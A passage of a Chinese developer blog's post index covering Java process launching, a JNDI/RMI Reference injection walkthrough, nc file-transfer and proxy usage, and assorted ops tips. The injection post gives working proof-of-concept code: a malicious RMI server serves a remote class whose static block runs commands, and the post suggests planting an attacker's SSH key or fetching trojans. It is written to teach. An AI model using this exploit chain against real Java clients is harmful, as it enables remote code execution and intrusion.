text.length); document.execCommand('copy'); document.body.removeChild(input); return true;} 从上面的实现可以了解其基本思路： 创建一个不可见的input 然后将text复制到这个input 然后利用document.execCommand来实现拷贝功能 最后移除这个input 一灰灰的联系方式尽信书则不如无书，以上内容，纯属一家之言，因个人能力有限，难免有疏漏和错误之处，如发现bug或者有更好的建议，欢迎批评指正，不吝感激 个人站点：https://blog.hhui.top 微博地址: 小灰灰Blog QQ： 一灰灰/3302797840 微信公众号：一灰灰blog","link":"/hexblog/2021/11/11/211111-Js实现粘贴板中写入text/"},{"title":"211231-Java调用本地程序的几种姿势","text":"作为一个后端同学，经常被安全的小伙伴盯上，找一找安全漏洞；除了常说的注入之外，还有比较吓人的执行远程命令，唤醒本地应用程序等；然后有意思的问题就来了，写了这么多年的代码，好像还真没有尝试过用java来唤醒本地应用程序的 比如说一个最简单的，打开本地的计算器，应该怎么搞？ 接下来本文将介绍一下如何使用java打开本地应用，以及打开mac系统中特殊一点的处理方式（直白来说就是不同操作系统，使用姿势不一样） 1. Runtime使用方式主要是基于Runtime.getRuntime().exec()来执行shell命令，来打开应用 传参就是需要打开的应用名 比如上面说到的打开计算器 1234// win系统Runtime.getRuntime().exec(\"exec\");// mac系统Runtime.getRuntime().exec(\"open -n /Applications/Calculator.app\") 从上面的传参也可以看出两者的区别，为什么mac会整一个 open -n， 这个其实可以理解为在终端执行命令，打开计算器 注意事项 对于mac系统而言，除了上面这种打开方式之外，还有下面这种姿势 1Runtime.getRuntime().exec(\"/Applications/Calculator.app/Contents/MacOS/Calculator\") 在exec中指定计算器的路径，有个很容易采的坑，直接写成下面这种 1Runtime.getRuntime().exec(\"/Applications/Calculator.app\") 上面这个直接执行之后会提示权限错误，其主要原因是mac系统的应用和win中的exe作为启动方式不太一样，对于mac而言，可以理解xxx.app为一个目录，真正执行文件是内部的xxx/Contents/MacOS/xxx 2. ProcessBuilder使用方式除了Runtime唤起之外，使用ProcessBuilder也属于非常常见的case 12345// winnew ProcessBuilder(\"exec\").start()// mac 注意，使用下面这个，则传参不能是 open -n xxxnew ProcessBuilder(\"/Applications/Calculator.app/Contents/MacOS/Calculator\").start() 使用上面这种姿势，特别需要注意的是内部传参不能是open -n 3. 小结从上面介绍的方式来看，其实打开应用程序的思路主要就是利用java来执行脚本命令；内容比较简单，隐患却是比较大的；在自己的项目中，最好不要出现这种调用方式 一灰灰的联系方式尽信书则不如无书，以上内容，纯属一家之言，因个人能力有限，难免有疏漏和错误之处，如发现bug或者有更好的建议，欢迎批评指正，不吝感激 个人站点：https://blog.hhui.top 微博地址: 小灰灰Blog QQ： 一灰灰/3302797840 微信公众号：一灰灰blog","link":"/hexblog/2021/12/31/211231-Java调用本地程序的几种姿势/"},{"title":"211216-JDNI注入：RMI Reference注入问题","text":"前面一篇介绍了基础的RMI的使用case JDNI注入：RMI基本知识点介绍 - 一灰灰Blog，其中有说到客户端通过rmi访问server时，表现和我们常见的rpc也一致，客户端拿到代理执行的方法，也是在远程服务端执行的，怎么就存在注入问题呢? 接下来我们再来看一个知识点，RMI + Reference，利用反序列化来实现注入 1. Reference服务端使用姿势区别于前面一篇rmi提供的远程接口访问方式，这里借助Refernce来实现，当客户单连接请求时，返回一个Class，当客户端拿到这个class并实例化时，实现我们预期的注入 服务器的实现与前面的大体相同，通过Registry起一个rmi服务，区别在于将之前的注册一个服务类改成注册一个Reference，如下 12345678910public static void main(String[] args) throws Exception { Registry registry = LocateRegistry.createRegistry(8181); Reference reference = new Reference(\"Inject\", \"Inject\", \"http://127.0.0.1:9999/\"); ReferenceWrapper wrapper = new ReferenceWrapper(reference); registry.rebind(\"inject\", wrapper); System.out.println(\"服务已启动\"); Thread.currentThread().join();} 注意上面的Reference的定义，三个参数 className：远程加载时所使用的类名； classFactory：加载的class中需要实例化类的名称； classFactoryLocation：远程加载类的地址，提供classes数据的地址可以是file/ftp/http等协议； 上面表示的是当客户端连接到这个rmi发起请求之后，会尝试从 http://127.0.0.1:9999/Inject.class 获取并加载class文件 接下来写一个简单的Inject类，在静态块中可以执行任何你想执行的代码 12345public class Inject { static { System.out.println(\"hello world\"); }} 启动一个简单的python服务器，这样可以直接通过网络加载这个class文件 1python3 http.server -m 9999 这样一个支持代码注入的rmi服务器就搭建完成了； 2. 客户端实测接下来看下客户单的访问姿势 123456789public static void injectTest() throws Exception { // 使用JDNI在命名服务中发布引用 Hashtable env = new Hashtable(); env.put(Context.INITIAL_CONTEXT_FACTORY, \"com.sun.jndi.rmi.registry.RegistryContextFactory\"); env.put(Context.PROVIDER_URL, \"rmi://127.0.0.1:8181\"); InitialContext context = new InitialContext(env); Object obj = context.lookup(\"rmi://127.0.0.1:8181/inject\"); System.out.println(obj);} 当jdk版本较高时，会发现有下面这种提示，表示默认不允许读取远程的class文件 1234Exception in thread &quot;main&quot; javax.naming.NamingException [Root exception is java.lang.ClassCastException: Inject cannot be cast to javax.naming.spi.ObjectFactory] at com.sun.jndi.rmi.registry.RegistryContext.decodeObject(RegistryContext.java:507) at com.sun.jndi.rmi.registry.RegistryContext.lookup(RegistryContext.java:138) at com.sun.jndi.toolkit.url.GenericURLContext.lookup(GenericURLContext.java:205) 我们先模拟一下注入的case，所以先将这个开关开上，直接在启动中添加下面这一行配置 1-Dcom.sun.jndi.rmi.object.trustURLCodebase=true 接下来看一下执行结果 重点关注上面输出的hello world，这个输出实际上是在Inject类的静态方法中输出的，在客户端被执行了； 接下来我们模拟一下，直接唤起客户单本地应用的case，在Inject类中，实现一个打开计算器的功能（可以借助 Runtime） 12345678910public class Inject { static { try { // mac 电脑用下面这个命令 Runtime.getRuntime().exec(\"open -n /Applications/Calculator.app\"); // win 电脑用下面这个 // Runtime.getRuntime().exec(\"calc\") } catch(Exception e) {} }} 接下来我们再来执行一下看看会发生什么，计算器是否会如期被唤起 看到上面这个的小伙伴可能会有疑问，不过是打开我的计算器，也没啥了不起的影响，但是请注意，上面这个Inject的静态类可以任由我们自己发挥 如果你的客户端是linux，那么直接在~/.ssh/authorized_keys中写入黑客的公钥，这样就可以直接登录服务器 直接下载木马、病毒在本机执行 …. 所以上面这个问题还是相当可怕的，幸好的是在Oracle JDK11.0.1, 8u191, 7u201, 6u211及之后的版本，trustURLCodebase这个配置默认是false，一般也不会有人特意去开启这个配置，所以问题不大 那么真的是问题不大么？且待后续博文 一灰灰的联系方式关联博文 211213-JDNI注入：RMI基本知识点介绍 - 一灰灰Blog 尽信书则不如无书，以上内容，纯属一家之言，因个人能力有限，难免有疏漏和错误之处，如发现bug或者有更好的建议，欢迎批评指正，不吝感激 个人站点：https://blog.hhui.top 微博地址: 小灰灰Blog QQ： 一灰灰/3302797840 微信公众号：一灰灰blog","link":"/hexblog/2021/12/16/211216-JDNI注入：RMI-Reference注入问题/"},{"title":"220127-MAC系统解决DST根证书过期问题","text":"let’s encrypt的根证书过期这事有关注的小伙伴应该都知道，这里记录一下最近遇到的坑 主要表现在于，一些使用let’s encrypt办法的https证书的网站，无法访问，正常访问时如下 直接提示根证书过期，其根证书是DST Root CA X3；但是非常奇怪的是换其他的电脑查看时，根证书却是 ISRG Root X1，正常有效 感觉就是系统版本太低的原因了（因为我的备用mac还是10.11.6，也没打算进行升级) 所以能做的就是将新的根证书添加到电脑里，具体的操作步骤如下 官方下载根证书 ISRG Root X1 or ISRG Root X1 DER 格式 ISRG Root X2 or ISRG Root X2 DER 格式 官方下载中级证书 lets-encrypt-r3.pem or lets-encrypt-r3.der 证书下载完毕之后，双击添加到设备，需要手动添加信赖（根+中级证书都需要） 注意双击之后，若发现加不了，则把锁那个地方点击一下，还需要手动的设置信赖证书 如上配置之后，就可以正常访问了let’s encrypt颁发证书的网站了 一灰灰的联系方式尽信书则不如无书，以上内容，纯属一家之言，因个人能力有限，难免有疏漏和错误之处，如发现bug或者有更好的建议，欢迎批评指正，不吝感激 个人站点：https://blog.hhui.top 微博地址: 小灰灰Blog QQ： 一灰灰/3302797840 微信公众号：一灰灰blog","link":"/hexblog/2022/01/27/220127-MAC系统解决DST根证书过期问题/"},{"title":"220225-巧用NC实现文件传输","text":"之前在服务器上拷贝文件时，要么使用scp, 要么就是上传到ftp服务器，然后再需要使用的服务器上重新下载，虽然这两种方式也没啥毛病，但是缺陷也比较明显 scp: 要求授权验证 ftp: 需要一个第三方的存储系统，用完之后如果不删除的话这个文件就一直在那 接下来介绍下使用ncat(即nc)来实现文件拷贝 nc知识点1. 基本说明 &amp; 安装ncat/nc 是一个类似于cat的网络命令，常用语网络读、写、重定向；它提供的功能非常强大，本文介绍一下将介绍一下基本使用姿势与应用场景 首先判断系统是否有安装 ubuntu 默认有这个命令 centos 需要自己安装 123# 判断是否有安装 ncat命令which ncat# which nc 也可以判断是否安装有这个命令 若没有安装，执行下面的命令 12sudo yum install nc -y# yum install nmap-ncat -y 2. 监听端口链接监听本机某个端口，相当于起了一个网络服务 12# nc -l 端口号nc -l 9999 注意 上面默认监听的是tcp端口 如需指定udp，可以通过 nc -l -u 9999 3. 连接远程服务器1234# nc ip 端口号nc 127.0.0.1 9999# 如果需要链接的是udp端口，可以加一个 -u 连上之后，就可以发送信息（回车之后服务端会接收到客户端的传输数据） 3. nc文件拷贝基于上面的case，可以利用nc来实现文件拷贝 目标服务器，启动一个端口监听 1nc -l 9999 &gt; save.txt 文件所属服务器，用于上传文件 1nc 127.0.0.1 9999 &lt; data.txt 说明 上面这个也可以走udp端口进行文件传输，加上-u即可 流程也可以反过来，在文件所属服务器上监听端口，目标服务器用于下载文件 (上面的方式适用于文件所属服务器限制了访问端口的场景；下面这种这种适用于目标服务器ip不确定的case) 12345# 文件所属服务器nc -l 9999 &lt; data.txt# 下载文件的服务器nc 127.0.0.1 9999 &gt; save.txt 4. nc作为代理使用nc作为一个简单的转发 1ncat -l 8080 | ncat 192.168.0.2 80 上面这个命令实现单向的转发，将链接到本机8080的连接转发到192.168.0.2:80 如果希望实现双向管道，可以如下 12mkfifo 2wayncat -l 8080 0&lt;2way | ncat 192.168.0.2 80 1&gt;2way 除了上面的代理方式，也可以利用nc来实现端口转发，借助 -c 命令 1ncat -u -l 80 -c 'ncat -u -l 8080' 5. 小结nc常用于服务器之间的网络数据传输，其基本参数如下 (通过nc -h获取) 1234567891011121314151617181920212223242526-4 使用IPV4-6 使用IPV6-c, --sh-exec &lt;command&gt; 接收到的命令通过command(例如/bin/bash)执行-e, --exec &lt;command&gt; 和-c差不多--lua-exec &lt;filename&gt; 接收到的数据通过脚本filename执行-m, --max-conns &lt;n&gt; 最大并发连接数(单独开启不生效，需配合--keep-open/--broker使用)-d, --delay &lt;time&gt; 读写收发间隔时间-o, --output &lt;filename&gt; 将会话数据转储到文件-i, --idle-timeout &lt;time&gt; 读写超时时间-p, --source-port port 指定连接使用的源端口号(client端使用)-s, --source addr 客户端指定连接服务器使用的ip(client端使用)-l, --listen 绑定和监听接入连接(server端使用)-k, --keep-open 在监听模式中接受多个连接(配合-m使用)-n, --nodns 不使用DNS解析主机名-t, --telnet 响应telnet连接-u, --udp 使用udp协议，默认tcp-v, --verbose 显示详细信息-w, --wait &lt;time&gt; 连接超时时间--allow 允许指定主机连接--allowfile 允许指定文件内的主机连接--deny 拒绝指定主机连接--denyfile 拒绝指定文件内的主机连接--broker 启用代理模式--proxy &lt;addr[:port]&gt; 指定代理主机ip和port--proxy-type &lt;type&gt; 指定代理类型(\"http\" or \"socks4\")--proxy-auth &lt;auth&gt; 代理身份验证 常用的命令 -l 用于监听一个端口号， -v用于显示连接详情， -u表示监听udp端口 本文给出了两个简单的实例 文件传输 请求转发 一灰灰的联系方式尽信书则不如无书，以上内容，纯属一家之言，因个人能力有限，难免有疏漏和错误之处，如发现bug或者有更好的建议，欢迎批评指正，不吝感激 个人站点：https://blog.hhui.top 微博地址: 小灰灰Blog QQ： 一灰灰/3302797840 微信公众号：一灰灰blog","link":"/hexblog/2022/02/25/220225-巧用NC实现文件传输/"},{"title":"220116-Win10子系统无法访问网络问题解决方案","text":"win10安装完Ubuntu子系统之后，结果发现无妨访问网络，不管ping啥都不行，下面记录一下解决方案 首先使用管理员权限打开powershell终端 然后执行以下命令 12345wsl --shutdownnetsh winsock resetnetsh int reset allnetsh winhttp reset proxyipconfig /flusdns 执行完毕之后，重启机器，然后就是见证奇迹的时刻了 本文主要来自: http://blog.csdn.net/xuankucom/article/details/121840902 一灰灰的联系方式尽信书则不如无书，以上内容，纯属一家之言，因个人能力有限，难免有疏漏和错误之处，如发现bug或者有更好的建议，欢迎批评指正，不吝感激 个人站点：https://blog.hhui.top 微博地址: 小灰灰Blog QQ： 一灰灰/3302797840 微信公众号：一灰灰blog","link":"/hexblog/2022/01/16/220116-Win10子系统无法访问网络问题解决方案/"},{"title":"220302-Grafana使用语法之ES/Luence篇","text":"Grafnan结合ElasticSearch，实现数据统计，大盘配置 1. 查询成员字段语法：{&quot;find&quot;: &quot;fields&quot;, &quot;type&quot;: &quot;keyword&quot;} find： 表示查什么东西 type：表示检索条件 如查询long类型的字段，可以如下处理 1234{ \"find\": \"fields\", \"type\": \"long\"} 什么时候用这个呢？ 比如我想知道这个es中定义了哪些字段 比如在配置Grafana的变量时，可以使用它来做一些限定 2. 查询成员值语法： {&quot;find&quot;: &quot;terms&quot;, &quot;field&quot;: &quot;成员名&quot;, &quot;size&quot;: 100} find：后面跟上的是 terms， 表示查询具体的值 field: 用于限定需要查的成员 size：数量限制，可以不填 举例如下，查询所有的服务器ip 1234{ \"find\": \"terms\", \"field\": \"server_ip\"} 使用范围： 常见于配置Grafana变量，配置一个服务器ip选择的变量，用于查看不同服务器的表现情况 3. 条件查询成员值在前面的基础上加一下限定，比如一个es为多个应用使用，此时我只关注其中app1的大盘，此时配置服务器时，想加一个条件限定 语法: {&quot;find&quot;: &quot;terms&quot;, &quot;field&quot;: &quot;成员名&quot;, &quot;query&quot;: &quot;k:v&quot;} query： lucence查询语法，要求成员k的值为v 举例，查询server_name = app的服务器ip 12345{ \"find\": \"terms\", \"field\": \"server_ip\", \"query\": \"server_name:app\"} 4. Lucene 查询语法配置大盘的查询条件，主要就是借助lucene语法来处理，接下来看一下常见的使用姿势 4.1 条件等于查询语法： field_name: filed_value filed_name: 字段名 field_value: 需要检索的值 注意： 中间使用英文冒号分隔，表示条件命中 4.2 不等于查询如果希望不等于查询，主要使用下面这种方式 !(field_name:field_value) 4.3 字段本身存在与否 _exists_:field_name: 查询包含field成员的记录 _missing_:field_name: 查询不包含field成员的记录 4.4 通配符查询在查询条件中，包含下面两个的表示使用通配查询 ?匹配打个字符 * 匹配0或多个字符 比如我有个应用，部署多个环境，分别名为 app-cn, app-usa，现在想统计整个应用的情况，就可以使用下面这种正则方式 1server_name: app-* 除了上面的示例，在实际的工作中，更常见的是url的统计，比如统计 /get/ 这个域名开头的请求 12# 下面使用了转义url: \\/get\\/* 4.5 模糊搜索在单次后面添加剂上 ~来实现模糊搜索，这种更适用于搜索业务场景，通常对于grafana的大盘配置，个人感觉不太实用 实用方式 12// 可以匹配 app-cnserver_name: app-nc~ 4.6 范围搜索除了前面的精确搜索，我们还可以进行范围搜索 语法： [ a TO b ], {a TO B} []： 闭包区间，包含左边的值 {}： 开区间，不包含两边值 a/b 如果为 * 表示某一侧不限制范围 实例演示，查询http状态码为 4xx 的case 1http_code: [400 TO 499] 除了上面这种写法，也可以使用 &gt; &lt;的方式，比如上面的写法等价 12// &gt;=400之间不要加上空格http_code: (&gt;=400 AND &lt;=499) 4.7 逻辑操作多条件组合，使用AND/OR来处理，这里的组合即可以表明多个field，也可以是一个field的多个value组合 如多字段匹配：找出app-cn应用中状态码为500的记录 1http_code:500 and server_name:app-cn 如多value匹配：找出状态码为500, 503的记录 1http_code: (500 OR 503) 4.8 转移字符当查询条件中，包含下面字符中的一个时，需要使用注意 特殊字符: + - = &amp;&amp; || &gt; &lt; ! ( ) { } [ ] ^ &quot; ~ * ? : \\ / 转义修饰: \\/ 如url的查询时，通常会用到转义 1url: \\/get\\/info 5. 小结本文主要介绍Grafana中使用es数据源时，常见的语法操作，当然其中Lucence的部分，在kibana中也同样适用； 通常来讲，在Grafana中，有下面几个地方会使用到上面的知识点 变量配置时，使用第1，2，3节中的方式，过滤出下拉选项 在大盘配置的Query输入框中，使用 Lucene 语法 在Explore中使用Lucene语法 参考博文： Lucene查询语法详解 一灰灰的联系方式尽信书则不如无书，以上内容，纯属一家之言，因个人能力有限，难免有疏漏和错误之处，如发现bug或者有更好的建议，欢迎批评指正，不吝感激 个人站点：https://blog.hhui.top 微博地址: 小灰灰Blog QQ： 一灰灰/3302797840 微信公众号：一灰灰blog","link":"/hexblog/2022/03/02/220302-Grafana使用语法之ES-Luence篇/"},{"title":"220321-ElasticSearch开启权限验证","text":"为了保证es的安全性，一般来讲我们会对es集群开启权限验证，下面将简单记录一下如何开启Basic Auth验证 修改配置文件 config/elasticsearch.yml，添加下面的配置 12xpack.security.enabled: truexpack.security.authc.accept_default_password: false 启动es服务 1bin/elasticsearch 生成密码 12# 执行完毕之后输入密码， 比如测试的密码都是 test123 (生产环境不要这么干)bin/elasticsearch-setup-passwords interactive es的交互，主要使用 Basic Auth 方式进行身份校验，简单来讲，就是在请求头中，添加 1Authorization: Basic ZWxhc3RpYzp0ZXN0MTIz 一灰灰的联系方式尽信书则不如无书，以上内容，纯属一家之言，因个人能力有限，难免有疏漏和错误之处，如发现bug或者有更好的建议，欢迎批评指正，不吝感激 个人站点：https://blog.hhui.top 微博地址: 小灰灰Blog QQ： 一灰灰/3302797840 微信公众号：一灰灰blog","link":"/hexblog/2022/03/21/220321-ElasticSearch开启权限验证/"},{"title":"220226-解决Centos下载时异常 Failed to download metadata for repo AppStream","text":"阿里云ecs服务器，通过yum install安装命令时，突然发现报错，提示信息如下 12345Repository extras is listed more than once in the configurationCentOS Linux 8 - AppStream 18 kB/s | 2.3 kB 00:00 Errors during downloading metadata for repository 'appstream': - Status code: 404 for http://mirrors.cloud.aliyuncs.com/centos/8/AppStream/x86_64/os/repodata/repomd.xml (IP: 100.100.2.148)Error: Failed to download metadata for repo 'appstream': Cannot download repomd.xml: Cannot download repodata/repomd.xml: All mirrors were tried 搜索一番之后发现原因貌似是 2022年1月1日起CentOS官方将不再对CentOS 8提供服务支持,虽然系统可以正常使用,但CentOS 8的yum源已经移除无法使用了,使用yum安装会报错：Repository extras is listed more than once in the configuration CentOS Linux 8 - AppStream Errors during downloading metadata for repository 'appstream': - Status code: 404 for 且不论原因为何，解决问题才是真理，下面记录一下阿里云centos的修复脚本 12345678910111213141516# 切root权限su root# 备份reporename '.repo' '.repo.bak' /etc/yum.repos.d/*.repo # 下载新的repowget https://mirrors.aliyun.com/repo/Centos-vault-8.5.2111.repo -O /etc/yum.repos.d/Centos-vault-8.5.2111.repowget https://mirrors.aliyun.com/repo/epel-archive-8.repo -O /etc/yum.repos.d/epel-archive-8.repo# 替换repo文件中的urlsed -i 's/mirrors.cloud.aliyuncs.com/url_tmp/g' /etc/yum.repos.d/Centos-vault-8.5.2111.repo &amp;&amp; sed -i 's/mirrors.aliyun.com/mirrors.cloud.aliyuncs.com/g' /etc/yum.repos.d/Centos-vault-8.5.2111.repo &amp;&amp; sed -i 's/url_tmp/mirrors.aliyun.com/g' /etc/yum.repos.d/Centos-vault-8.5.2111.reposed -i 's/mirrors.aliyun.com/mirrors.cloud.aliyuncs.com/g' /etc/yum.repos.d/epel-archive-8.repo# 重建缓存yum clean all &amp; yum make cache 完事之后，重新执行以下安装命令，判断是否ok，比如安装nc命令 1yum install nc -y 一灰灰的联系方式尽信书则不如无书，以上内容，纯属一家之言，因个人能力有限，难免有疏漏和错误之处，如发现bug或者有更好的建议，欢迎批评指正，不吝感激 个人站点：https://blog.hhui.top 微博地址: 小灰灰Blog QQ： 一灰灰/3302797840 微信公众号：一灰灰blog","link":"/hexblog/2022/02/25/220226-解决Centos下载时异常-Failed-to-download-metadata-for-repo-AppStream/"},{"title":"220507-mysql-connector-java-utf8mb4编码支持","text":"对于mysql而言，我摩恩知道utf8与utf8mb4两种编码之间是不同的，通常来说我们推荐使用后者，可以用来存储emoj表情；通常而言，上面的编码对于我们的实际使用并没有什么影响，然而现实总有特殊场景 下面记录一下定位mysql-connector-java客户端建立连接，设置编码的全过程 1. 编码设置解决unicode读写问题当我们直接使用终端连接mysql时，可能会出现emoj无法正确查看的场景，如下 比如直接再终端连接mysql，查看连接编码 1show variables like 'char%' 而我们实际上希望的是utf8mb4，当连接编码使用utf8时，在我们查看emoj表情会有问题 当我们修改了编码之后，则正常显示 1SET NAMES utf8mb4 那么问题来了，通过java代码连接之后，为什么我们一般都不会去主动设置 set names utfmb4，在实际使用的时候也没有问题，why? 2. 源码分析mysql-connector-java 5.x版本java侧，通常是使用上面这个包来建立连接，首先是在连接url中指定编码 1jdbc:mysql://127.0.0.1:3306/story?useUnicode=true&amp;characterEncoding=UTF-8&amp;useSSL=false&amp;serverTimezone=Asia/Shanghai 注意：useUnicode=true&amp;characterEncoding=UTF-8 这两个配置很重要 对于5.x系列，关键代码在 1com.mysql.jdbc.ConnectionImpl 在上面的实现中有一个版本判断，当mysql服务器的版本 &gt;= 5.5.2时，utf8mb4Supported= true 再看一下设置连接编码的条件配置 12345678910if (!getUseOldUTF8Behavior()) { if (dontCheckServerMatch || !characterSetNamesMatches(\"utf8\") || (utf8mb4Supported &amp;&amp; !characterSetNamesMatches(\"utf8mb4\")) || (connectionCollationSuffix.length() &gt; 0 &amp;&amp; !getConnectionCollation().equalsIgnoreCase(this.serverVariables.get(\"collation_server\")))) { execSQL(null, \"SET NAMES \" + utf8CharsetName + connectionCollationSuffix, -1, null, DEFAULT_RESULT_SET_TYPE, DEFAULT_RESULT_SET_CONCURRENCY, false, this.database, null, false); this.serverVariables.put(\"character_set_client\", utf8CharsetName); this.serverVariables.put(\"character_set_connection\", utf8CharsetName); }} dontCheckServerMatch = false characterSetNamesMatches 这个方法，主要是判断mysql服务器的配置 character_set_client + character_set_connection 是否与客户端设置的编码一致，若不一致表示需要修改 比如当服务端设置的是utf8时， (utf8mb4Supported &amp;&amp; !characterSetNamesMatches(&quot;utf8mb4&quot;)) 这个条件满足 若服务端设置的是utf8mb4时，!characterSetNamesMatches(&quot;utf8&quot;) 这个条件满足 其次就是collation_server 这个配置不匹配时，也会执行下面的编码设置 基于上面的分析，我们走到了set names utf8mb4的编码设置，即不需要我们再手动去设置这个编码了，就可以愉快的使用utf8mb4进行玩耍了 再捞一下源码提交历史，最早的这个版本限制来自于10年6月，后续又有一般通过server charaset来判断是否可以指定utf8mb4编码， 最后又在18年7月的时候，支持通过在url中设置参数connectionCollation 来指定具体编码(具体的源码在下面8.x版本有分析) 从提交历史来看，要使用connectionCollation 来指定链接编码时，请确保依赖版本大与等于 5.1.47 mysql-connector-java 8.x版本8.x版本的连接之后，设置编码的逻辑与上面不太一样，核心代码在下面 （以8.0.20版本为例） 1com.mysql.cj.NativeSession#configureClientCharacterSet 注意：最新版本上面设置字符编码的逻辑，迁移到 com.mysql.cj.NativeCharsetSettings#configurePostHandshake 中了 在8.x版本中，获取字符集在更前面一点，下面框出来的逻辑，主要是解析url中的connectionCollation配置，当不存在这个配置时，若realJavaEncoding = utf8则默认使用utf8mb4 (5.x也有下面这个逻辑，具体代码在 com.mysql.jdbc.ConnectionImpl#configureClientCharacterSet) 因此基于上面的实现，可以通过下面的方式指定具体的编码 1jdbc:mysql://127.0.0.1:3306/story?connectionCollation=utf8mb4_general_ci&amp;useUnicode=true&amp;characterEncoding=UTF8&amp;useSSL=false&amp;serverTimezone=Asia/Shanghai 最后同样看一下设置 utf8mb4 连接编码的条件限定，其实和5.x的是一致的 123456789if (dontCheckServerMatch || !this.protocol.getServerSession().characterSetNamesMatches(\"utf8\") || (!this.protocol.getServerSession().characterSetNamesMatches(\"utf8mb4\")) || (connectionCollationSuffix.length() &gt; 0 &amp;&amp; !connectionCollation.equalsIgnoreCase(this.protocol.getServerSession().getServerVariable(\"collation_server\")))) { sendCommand(this.commandBuilder.buildComQuery(null, \"SET NAMES \" + utf8CharsetName + connectionCollationSuffix), false, 0); this.protocol.getServerSession().getServerVariables().put(\"character_set_client\", utf8CharsetName); this.protocol.getServerSession().getServerVariables().put(\"character_set_connection\", utf8CharsetName);} 3. 解决办法上面两个主要分析了为什么我们平时使用的时候，不需要设置连接编码，但是请注意，默认场景下并不是一定没问题，比如5.x客户端，若mysql的服务器版本小于5.5.2，那也不成，因此为了以防万一，最好的方式就是在连接url中，指定connectionCollation，即使用下面的方式 1jdbc:mysql://127.0.0.1:3306/story?connectionCollation=utf8mb4_general_ci&amp;useUnicode=true&amp;characterEncoding=UTF8&amp;useSSL=false&amp;serverTimezone=Asia/Shanghai connectionCollation: 连接字符集 characterEncoding: 字符编码 useUnicode 使用connectionCollation配置时，请确保版本 5.x: &gt;= 5.1.47 8.x: &gt;= 8.0.13 其次就是服务器端设置默认编码为 utf8mb4 1default-character-set=utf8mb4","link":"/hexblog/2022/05/07/220507-mysql-connector-java-utf8mb4编码支持/"},{"title":"220608-Nginx重定向的两种配置方式","text":"一段时间没有配置过nginx，果不其然之前学到的又还回去了，下面给出基于rewrite/alias的两种重定向配置方式 需求设置 /ximg 路径下的请求，访问 /home/yihui/html 下的html文件，应该怎么配置? 1. root指定方式最容易想到的就是直接指定root，如下 1234location /ximg { root /home/yihui/html/; index index.html;} 直接使用上面这种方式，访问之后会发现404，此时若再路径 /home/yihui/html/ximg/ 下存在文件 index.html，则可以正常访问 即上面这种配置，再实际访问文件时，会再 root 配置的路径下 + url请求路径（即上面的ximg） 所以单纯使用root时，我们需要额外处理的是将希望访问的所有文件，都放在 ximg 目录下 2. root + rewrite 方式当我们希望能直接访问到 /home/yihui/html/ 目录下的文件时，可以考虑结合 rewrite 来重定向实现，如 1234location /ximg/ { root /home/yihui/html/; rewrite ^/ximg/(.*)$ /$1 break;} 上面这个使用正则匹配，实现重定向，这样访问资源时，直接从 /home/yihui/html 下查找了；但是需要注意，若nginx中配置了一个/tt 的规则，此时若访问 /ximg/tt 时，会转到请求 /tt了 3. alias 方式直接使用alias来重置文件目录，这样在访问时，不需要补ximg目录 1234location /ximg { alias /home/yihui/html/; index index.html;} 总体来看，这种方式属于最简单的姿势了 4.小结主要针对root + alias两个进行说明 root：设置根目录，在实际访问文件时，会在根目录下，查找匹配的path路径下的文件（即path路径需要作为资源的目录树层级） alias：重置当前文件的目录，不需要补path路径 一灰灰的联系方式尽信书则不如无书，以上内容，纯属一家之言，因个人能力有限，难免有疏漏和错误之处，如发现bug或者有更好的建议，欢迎批评指正，不吝感激 个人站点：https://blog.hhui.top 微博地址: 小灰灰Blog QQ： 一灰灰/3302797840 微信公众号：一灰灰blog","link":"/hexblog/2022/06/08/220608-Nginx重定向的两种配置方式/"},{"title":"220526-程序员的浪漫-用她的名字作画Python版","text":"hello，大家好，我是一灰灰，之前介绍了一篇使用她的名字来画出她的美图的文章，其中主要使用的Java来实现的，今天呢，我们再来用Python来实现一下 同样最终的代码量也不会超过三十行 1. 环境相关这里我们选择python来作为我们的主要绘图武器，至于python的环境安装相关的这里就不介绍了，有兴趣的小伙伴自行探索 再python界，操作图片的利器PIL，相信大伙也都清楚，接下来将使用它来实现我们的目标 安装依赖 1pip install Pillow 2. 基本知识点再正式开始之前，给不太熟悉PIL操作的小伙伴，简单介绍一下它的基本用法，当然也会重点突出一下我们将采用的几个方法 2.1 加载图片123from PIL import Imageimg = Image.open(\"图片地址\") 是的，就这么简单，直接使用 Image.open() 就可以读取图片了 2.2 图片基本信息获取获取图之后，通常需要关注的几个参数，如宽高，通道 1234width, height = img.size# RGBA 表示包含透明度，如png# RGB 不包含透明度，如jpgmode = img.mode 2.3 创建画板，用于编辑如果我们想在这个图片上进行绘制信息，或者说希望创建一个空的画板，那么我们就先需要获取到一个ImageDraw对象 1234from PIL import ImageDraw# 获取图片对应的画板draw = ImageDraw.Draw(img) 上面获取到draw对象之后，就可以根据它提供的各种方法，来绘制各种几何图形、文字、图片等；如果我们希望获取一个空的画板，可以怎么操作呢？ 123# 创建一个待透明度的图，第二个元组参数为图的宽高，第三个表示背景全透明new_img = Image.new(\"RGBA\", (width, height), (255, 255, 255, 0)) ImageDraw提供了很多绘图的方法，下面给出一些常用的case，就不重点叙述了 123456789101112131415161718new_img = Image.new(\"RGBA\", (480, 640), (255, 255, 255, 0))# 创建绘制对象draw = ImageDraw.Draw(new_img)# 从 (10, 10) -&gt; (100, 100) 画一条黄色直线draw.line((10, 10, 100, 100), 'red')# 绘制矩形 (100, 110) -&gt; (200, 200),黑色填充,黄色填充draw.rectangle((100, 110, 200, 200), 'black', 'red')# 绘制椭圆draw.ellipse((300, 300, 500, 400), 'yellowgreen', 'red')# 园draw.ellipse((250, 250, 350, 350), 'seagreen', 'red')# 绘制文本，选择宋体，字体大小为28，uniquecode编码font = ImageFont.truetype(\"simsun.ttc\", 28, encoding=\"unic\")draw.text((300, 200), u'一灰灰Blog', 'red', font) 重点关注绘制文本这里，draw.text((x,y), &quot;文字&quot;, &quot;文字颜色&quot;, 字体), 这就是接下来要使用的方法 2.4 获取像素如果我们希望获取指定坐标的RGB值，如下操作即可 1pixel = img.getpixel((x, y)) 看到这里的小伙伴，结合前一篇博文，要想实现python版的用她的名字绘图，相信就很简单了吧 2.5 预览和保存图片12345# 展示图片new_img.show()# 保存图片new_img.save(\"save.png\") 3. Python版文字绘图接下来，进入正式的实现 1234567891011121314151617181920from PIL import Imagefrom PIL import ImageDrawfrom PIL import ImageFontdef render(path: str, name: str, save: str): img = Image.open(path) width, height = img.size # 创建画板，放大24倍 new_img = Image.new(\"RGBA\", (width * 24, height * 24), (255, 255, 255, 0)) draw = ImageDraw.Draw(new_img) # 加载自定义字体，字体文件来自 